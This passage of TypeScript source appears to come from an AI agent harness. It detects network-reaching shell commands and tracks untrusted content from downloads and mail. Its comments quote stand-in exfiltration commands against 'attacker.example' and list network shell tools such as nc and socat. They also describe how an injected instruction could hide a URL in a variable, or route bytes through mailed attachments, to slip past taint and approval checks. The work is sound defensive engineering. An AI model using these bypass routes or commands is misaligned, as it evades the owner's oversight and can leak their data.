 * anchors, so no separate refusal for the shapes a shell composes at run time is needed and none is
 * kept: one was, and it cost precision rather than buying safety. `curl 'attacker.example/?q=a b'`
 * came back as an address this could not read, charged four bytes for the word `curl`, while the
 * host and the payload were both written out in front of it.
 *
 * `localhost` is named because it is the one host in daily use here with no dot in it, and the
 * alternative was a card in front of `curl localhost:3000/health` on every tainted turn. It is not
 * a way out of anything: `classifyDestination` sends loopback and the private ranges to
 * `isPublicHttpUrl`, which is where somewhere-data-cannot-go is decided for every tool at once.
 */
const DOTTED_NAME = /^(?:localhost|(?:[a-z0-9_-]+\.)+[a-z][a-z0-9-]+)$/i;

/**
 * The request one command argument would make, as an address, or '' when it names none.
 *
 * An address in a shell command is not a URL: it is written without a scheme (`curl x.example/q`),
 * with a user in front of it (`ssh me@x.example`), with a port after it (`nc x.example 443`) or
 * with a remote path after a colon (`scp f me@x.example:/tmp`). All four put the name first, so the
 * name is taken from the front and whatever follows is kept as the path - the part the budget then
 * charges. The scheme is filled in as https because `classifyDestination` reads only http and https
 * and neither the charge nor the host judgement depends on which of the two it is.
 */
const addressFromArgument = (raw: string): string => {
  const token = raw.replace(/^['"]+|['"]+$/g, '').trim();
  if (!token) return '';
  if (/^[a-z][a-z0-9+.-]*:\/\//i.test(token)) return /^https?:\/\//i.test(token) ? token : '';
  const body = token.slice(token.lastIndexOf('@') + 1);
  const cut = body.search(/[/?#]/);
  const authority = cut < 0 ? body : body.slice(0, cut);
  const tail = cut < 0 ? '' : body.slice(cut);
  const [host = '', port = ''] = authority.split(':');
  if (!(IPV4_LITERAL.test(host) || DOTTED_NAME.test(host))) return '';
  try {
    return new URL(`https://${host}${/^\d+$/.test(port) ? `:${port}` : ''}${tail || '/'}`).href;
  } catch {
    return '';
  }
};

/**
 * The option this argument is and the value it carries, when the option is one of `table`.
 *
 * `takesNext` is what separates `--header 'X: y'` from `--header=X: y`: the first eats the token
 * after it and the second does not, and reading them the same way either swallowed the address or
 * put the whole `--header=X: y` on the card as the option's name.
 */
const optionValueAt = (
  commandArgs: readonly string[],
  index: number,
  table: ReadonlySet<string> | undefined
): { option: string; value: string; takesNext: boolean } | null => {
  const argument = commandArgs[index] ?? '';
  if (!table) return null;
  const joined = argument.indexOf('=');
  if (argument.startsWith('--') && joined > 0) {
    const option = argument.slice(0, joined);
    return table.has(option.toLowerCase())
      ? { option, value: argument.slice(joined + 1), takesNext: false }
      : null;
  }
  const named = argument.startsWith('--') ? table.has(argument.toLowerCase()) : table.has(argument);
  // `-so page.html` is `-s` and `-o` written together, and only the last letter of a cluster takes
  // the value. Without this the filename came back as a host and carded an ordinary download.
  const clustered =
    !argument.startsWith('--') &&
    argument.startsWith('-') &&
    argument.length > 2 &&
    table.has(`-${argument.slice(-1)}`);
  if (!(named || clustered)) return null;
  return {
    option: clustered ? `-${argument.slice(-1)}` : argument,
    value: commandArgs[index + 1] ?? '',
    takesNext: true
  };
};

/**
 * Every address one resolved command would reach, and the material it would carry there.
 *
 * The addresses and the carried material come back as one list of URLs because that is what the
 * budget measures and what the card names: `classifyDestination` charges a request by its host and
 * by the pieces of it the model composed, and a header value is a piece the model composed. The
 * address is left byte-identical when the command carries nothing extra, which is what keeps the
 * whole-address credit in `egress.ts` working for a link the harness handed over.
 */
const commandAddresses = ([executable = '', ...commandArgs]: readonly string[]): string[] => {
  const name = executable.toLowerCase();
  const local = LOCAL_VALUE_OPTIONS[name];
  const carriedTable = CARRIED_VALUE_OPTIONS[name];
  const skip = new Set<number>();
  const carried: Array<[string, string]> = [];
  commandArgs.forEach((_argument, index) => {
    const localOption = optionValueAt(commandArgs, index, local);
    if (localOption?.takesNext) skip.add(index + 1);
    const carriedOption = optionValueAt(commandArgs, index, carriedTable);
    if (!carriedOption) return;
    if (carriedOption.takesNext) skip.add(index + 1);
    if (carriedOption.value) carried.push([carriedOption.option, carriedOption.value]);
  });
  const candidates = commandArgs
    .map((argument, index) => (skip.has(index) || /^[-+]/.test(argument) ? '' : argument))
    .filter(Boolean);
  const resolve = (tokens: readonly string[]): string[] =>
    tokens.map(addressFromArgument).filter(Boolean);
  let addresses: string[] = [];
  // `dig @1.1.1.1 <name>` asks a resolver of the model's choosing, and that resolver is where the
  // name goes; `addressFromArgument` takes the host from after the last `@` for exactly this and
  // for `ssh me@host`, so the server needs no branch of its own.
  if (FETCH_CLIENT_EXECUTABLES.has(name) || RESOLVING_EXECUTABLES.has(name))
    addresses = resolve(candidates);
  else if (CONNECTING_EXECUTABLES.has(name)) addresses = resolve(candidates).slice(0, 1);
  else if (REMOTE_SPEC_EXECUTABLES.has(name))
    addresses = resolve(candidates.filter((argument) => /[:@]/.test(argument)));
  if (!addresses.length)
    return FETCH_CLIENT_EXECUTABLES.has(name)
      ? // Carded and charged as the unreadable address it is. What goes back is the token the
        // command actually wrote plus whatever it carries, so the bytes charged are bytes that are
        // really present rather than a number invented here, and `classifyDestination` reports it
        // through its own unparseable branch.
        [
          [
            commandArgs.find((argument) => /[$`]/.test(argument)) || name,
            ...carried.map(([, value]) => value)
          ].join(' ')
        ]
      : [];
  if (!carried.length) return addresses;
  const [first = '', ...rest] = addresses;
  try {
    const url = new URL(first);
    for (const [option, value] of carried) url.searchParams.append(option, value);
    return [url.href, ...rest];
  } catch {
    return addresses;
  }
};

/**
 * Every address one tool call would reach, whichever tool it is.
 *
 * One list, because two of them drift: the approval floor asks what a call reaches in order to
 * judge it, and the turn's novelty budget asks the same question in order to charge it, and an
 * address only one of them knows about is either an unjudged request or an unpaid one. A batch is
 * twenty-four actions wearing one action name, so the navigate inside one is here too.
 *
 * For `shell` this reads the commands the call really runs, wrappers and interpreter off, and not
 * only the http(s) addresses spelled out in it. The literal scan stays alongside because it is the
 * one reader that works on a shape `effectiveCommands` cannot resolve at all - a script handed to
 * an interpreter as a file, an address in a program this has never heard of - and the two are
 * unioned rather than chosen between.
 */
export const callDestinations = (name: string, args: Record<string, unknown>): string[] => {
  if (name === 'parallel_web_read') return Array.isArray(args.urls) ? args.urls.map(String) : [];
  if (name === 'browser_action')
    return [
      textValue(args.url),
      ...(Array.isArray(args.actions)
        ? args.actions.map((step) => textValue((step as { url?: unknown } | null)?.url))
        : [])
    ].filter(Boolean);
  if (name === 'shell' || name === 'desktop_launch') {
    const resolved = effectiveCommands(args).flatMap(commandAddresses);
    // A literal the resolved list already accounts for is the same request, not a second one:
    // `https://x/` and the `https://x/?…` that carries the header are one call and must be one
    // verdict, or the host is charged twice and named twice on the card.
    const spelled = literalUrlsInCommand(args).filter(
      (url) => !resolved.some((address) => address.startsWith(url))
    );
    return [...new Set([...resolved, ...spelled])];
  }
  return [];
};

/**
 * Where the browser and the network-reaching commands drop what they fetched.
 *
 * Everything under it is bytes somebody else wrote, sitting in the owner's own workspace, which is
 * the one place the "reads of the owner's computer are not tainted" rule has to make an exception
 * for. Declared here rather than beside the classifier in the agent loop because both the file
 * readers and `shell` have to agree on it, and two lists would drift.
 */
export const DOWNLOAD_QUARANTINE_PREFIXES = [
  'workspace/downloads/',
  'downloads/',
  // The attachment directory is the same fact by another route. context.ts tells the model, in the
  // always-resident operating contract, to save an attachment into the workspace before reading it
  // there, and agent.ts saves it here - so the bytes a stranger e-mailed arrived in the workspace
  // wearing the owner's own clothes. The connector read taints the turn that fetched it; a later
  // task reading the file back was judged clean, and on a clean turn the egress budget is not
  // charged, a write to ATHANOR.md raises no card and a read of any host raises no card.
  'workspace/mail/',
  'mail/'
];

/** A workspace path as the quarantine rule compares it: leading `./` and `/` stripped. */
const quarantineRelative = (path: string): string => path.replace(/^\.?\//, '');

export const isQuarantinedDownloadPath = (path: string): boolean =>
  DOWNLOAD_QUARANTINE_PREFIXES.some((prefix) => quarantineRelative(path).startsWith(prefix));

/**
 * Git subcommands that talk to a remote. The rest of git is local history, and a rule that treated
 * `git status` as a network read would taint most of the repository work this product exists for.
 */
const NETWORK_GIT_SUBCOMMANDS = new Set([
  'clone',
  'fetch',
  'pull',
  'ls-remote',
  'submodule',
  'archive'
]);

/**
 * Commands whose whole purpose is to bring back what is at the other end of a connection. Unlike
 * git and the package managers there is no local mode to distinguish, so the executable settles it.
 */
const NETWORK_CLIENT_EXECUTABLES = new Set([
  'aria2c',
  'curl',
  'ftp',
  'gh',
  'http',
  'httpie',
  'nc',
  'ncat',
  'netcat',
  'scp',
  'sftp',
  'socat',
  'ssh',
  'wget',
  'yt-dlp',
  'youtube-dl'
]);

/**
 * Where the untrusted content in a `shell` result came from, or null when the command only touched
 * the owner's own computer.
 *
 * Two channels, both reachable by an attacker and neither of them labelled until now.
 *
 * The first is the command that fetches. `network: true` was the whole test, and it is a
 * declaration rather than a gate: the installer ships the per-command namespace off, because a
 * command with its own loopback breaks published previews, so `curl https://attacker.example/brief`
 * reaches the internet whether or not the model ticked the box - and a model following an injected
 * instruction has every reason not to tick it. So the invocation is judged instead: a client whose
 * only job is to fetch, a git subcommand that talks to a remote, a package manager installing or
 * updating, or an http(s) address named anywhere in the command including inside an inline script.
 * The last one is what covers `python3 -c` and every interpreter after it without naming any of
 * them. What is deliberately not here is the rest of git, the rest of the package managers, and
 * every build and test command - `git status` and `pnpm test` read nothing from outside, and a
 * floor that rose on them would raise a card on the ordinary work and be tapped through.
 *
 * The second is the download directory. `file_read`, `document_read` and `image_read` have always
 * treated it as quarantine; `shell` did not, so `cat workspace/downloads/terms.txt` put the same
 * bytes into the same window with the floor still reporting the turn as clean.
 */
/**
 * Whether one resolved command brings bytes back from outside this computer.
 *
 * Asked of a command rather than of an invocation, so the same three tests apply to `curl …`, to
 * the `curl` inside `bash -lc '…'`, and to the `curl` inside `timeout 30 …`.
 */
const fetchesRemoteContent = ([executable = '', ...rest]: readonly string[]): boolean => {
  const name = executable.toLowerCase();
  return (
    NETWORK_CLIENT_EXECUTABLES.has(name) ||
    (name === 'git' && NETWORK_GIT_SUBCOMMANDS.has(gitSubcommand([...rest]) ?? '')) ||
    (packageRemovalExecutables.has(name) &&
      rest.some((argument) => packageInstallCommands.has(argument.toLowerCase())))
  );
};

export const untrustedShellOrigin = (args: Record<string, unknown>): string | null => {
  const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
  const script = commandScript(args);
  /*
   * The invocation used to be judged at its outer executable, with a scan for a literal http(s)
   * address as the only thing that reached inside a script. That scan is what made the hole look
   * closed: `bash -lc 'curl https://x'` names an address, so it tainted. Take the address out of
   * the command - which every real script does the moment the URL sits in a variable, and which an
   * injected instruction has every reason to do - and the interpreter was an unknown executable
   * running an unknown command. `bash -lc 'curl -s "$U" -o page.html'` read an attacker-chosen page
   * into the turn, `shellDestinations` found no address to charge to the novelty budget, and the
   * floor went on reporting the turn clean: no egress card on what left afterwards, and a write to
   * the brief with no card either. The address scan stays, because it catches the shapes this
   * cannot resolve; it is no longer the only thing looking past the wrapper.
   */
  /*
   * The literal scan and not `callDestinations`, and the difference is the question rather than an
   * oversight. That one asks where a request goes, so it reads a name lookup and a bare host as the
   * destinations they are; this one asks whether somebody else's bytes came back into the window,
   * and a `ping` sends far more than it returns. Widening this to the same reader would mark a turn
   * as having read untrusted content because it checked whether a host was reachable, and taint is
   * the input to every other floor in this file.
   */
  if (
    args.network === true ||
    effectiveCommands(args).some(fetchesRemoteContent) ||
    literalUrlsInCommand(args).length > 0
  )
    return 'network command output';
  // Split on the same separators the durable-path rule uses, so a redirect or a pipe inside an
  // inline script cannot hide the path the way `cat < downloads/x` would past a bare argument scan.
  const tokens = [...commandArgs, ...script.split(/[\s'"`>|;()<]+/)].filter(Boolean);
  const quarantined = tokens.find(isQuarantinedDownloadPath);
  return quarantined ? `downloaded file ${quarantineRelative(quarantined)}` : null;
};
